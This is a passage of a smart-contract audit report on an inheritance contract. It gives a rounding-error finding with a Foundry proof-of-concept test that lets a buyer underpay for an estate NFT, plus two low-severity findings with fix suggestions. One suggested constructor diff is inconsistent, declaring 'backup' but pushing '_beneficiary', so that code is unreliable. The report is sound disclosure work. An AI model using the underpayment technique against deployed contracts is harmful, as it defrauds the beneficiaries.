The `finalAmount` in this function calculates by dividing before multiplying and this can cause rounding error. Allowing the buyer of the estate NFT to pay a lower price as intended.

### Vulnerability Details
`finalAmount` may cause rounding error as it divides before multiplying.
```
function buyOutEstateNFT(uint256 _nftID) external onlyBeneficiaryWithIsInherited {
        uint256 value = nftValue[_nftID];
        uint256 divisor = beneficiaries.length;
        uint256 multiplier = beneficiaries.length - 1;
@>        uint256 finalAmount = (value / divisor) * multiplier;
        IERC20(assetToPay).safeTransferFrom(msg.sender, address(this), finalAmount);
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            if (msg.sender == beneficiaries[i]) {
                return;
            } else {
                IERC20(assetToPay).safeTransfer(beneficiaries[i], finalAmount / divisor);
            }
        }
        nft.burnEstate(_nftID);
    }
```

### Impact/Proof of Concept
In this POC, the buyer is supposed to pay 6.66666 but because of rounding error, it only needs to pay a cheaper price.
```
function test_buyOutEstateNFTRoundingError() public {
        // Create 2 more beneficiary and user3 as NFT buyer
        address user2 = makeAddr("user2");
        address user3 = makeAddr("user3");

        // Give the buyer funds to purchase estate
        usdc.mint(user3, 10);

        // Add the beneficiaries
        vm.startPrank(owner);
        im.addBeneficiery(user1);
        im.addBeneficiery(user2);
        im.addBeneficiery(user3);

        // Create Estate NFT
        uint256 NFTvalue = 10;
        im.createEstateNFT("condominium", NFTvalue, address(usdc));
        vm.stopPrank();

        // Fast forward 90 days
        vm.warp(90 days + 1);
        
        // Buyer purchase NFT
        vm.startPrank(user3);
        usdc.approve(address(im), 6); // Due to rounding error, buyer only need to pay 6 instead of 6.6666666...
        im.inherit(); // This set `isInherited` as True to allow buying EstateNFT
        im.buyOutEstateNFT(1);
        vm.stopPrank();
    }
```
Results
```diff
[PASS] test_buyOutEstateNFTRoundingError() (gas: 443603)
Traces:
  [443603] InheritanceManagerTest::test_buyOutEstateNFTRoundingError()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802]
    ├─ [0] VM::label(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], "user2")
    │   └─ ← [Return] 
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec]
    ├─ [0] VM::label(user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], "user3")
    │   └─ ← [Return] 
    ├─ [46784] ERC20Mock::mint(user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], 10)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], value: 10)
    │   └─ ← [Stop] 
    ├─ [0] VM::startPrank(owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266])
    │   └─ ← [Return] 
    ├─ [69020] InheritanceManager::addBeneficiery(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802])
    │   └─ ← [Stop] 
    ├─ [23120] InheritanceManager::addBeneficiery(user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec])
    │   └─ ← [Stop] 
    ├─ [145826] InheritanceManager::createEstateNFT("condominium", 10, ERC20Mock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   ├─ [95512] NFTFactory::createEstate("condominium")
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], tokenId: 1)
    │   │   ├─ emit MetadataUpdate(_tokenId: 1)
    │   │   └─ ← [Return] 1
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::warp(7776001 [7.776e6])
    │   └─ ← [Return] 
    ├─ [0] VM::startPrank(user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec])
    │   └─ ← [Return] 
    ├─ [24735] ERC20Mock::approve(InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 6)
    │   ├─ emit Approval(owner: user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], spender: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 6)
    │   └─ ← [Return] true
    ├─ [22686] InheritanceManager::inherit()
    │   └─ ← [Stop] 
    ├─ [83206] InheritanceManager::buyOutEstateNFT(1)
    │   ├─ [26058] ERC20Mock::transferFrom(user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], 6)
    │   │   ├─ emit Transfer(from: user3: [0xc0A55e2205B289a967823662B841Bd67Aa362Aec], to: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], value: 6)
    │   │   └─ ← [Return] true
    │   ├─ [25204] ERC20Mock::transfer(user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], 2)
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: user1: [0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF], value: 2)
    │   │   └─ ← [Return] true
    │   ├─ [25204] ERC20Mock::transfer(user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], 2)
    │   │   ├─ emit Transfer(from: InheritanceManager: [0x88F59F8826af5e695B13cA934d6c7999875A9EeA], to: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], value: 2)
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 6.59ms (336.25µs CPU time)
```
### Recommendations
It is recommended to multiply first then perform division.

## <a id="low-01"></a>L-01: Users may lose access to primary wallet and gets funds stucked before adding secondary wallet as beneficiary

### Summary
There is a window between contract creation and adding the user's secondary wallet as a beneficiary, where users may lose their keys to the primary wallet. Causing funds to be stuck inside the contract forever.

### Vulnerability Details
The InheritanceManager contract does not enforce user to add backup secondary wallet as beneficiary.

### Impact/Proof of Concept
If user loses keys to the primary wallet before adding secondary backup wallet as beneficiary. Which causes funds to be stuck in the contract forever.

### Recommendations
It is recommended to enforce adding secondary wallet address as beneficiary during contract creation in the constructor
```diff
+constructor(address backup) {
        owner = msg.sender;
        nft = new NFTFactory(address(this));
+        beneficiaries.push(_beneficiary);
    }
```

## <a id="low-02"></a>L-02: Multiple functions do not reset the 90 days timer

### Summary
As intended by the protocol, every transaction by the owner should reset the 90 days timer, but multiple functions do not reset it.

### Vulnerability Details
The following functions is missing `_setDeadline()` and does not reset the 90 days timer.
```
InheritanceManager.sol::contractInteractions()
InheritanceManager.sol::createEstateNFT()
InheritanceManager.sol::removeBeneficiary()
```

### Impact/Proof of Concept
This prevents the protocol from working as intended, which is to reset the 90 days timer when owner performs a transaction with the contract.

### Recommendations
Add `_setDeadline()` to the mentioned functions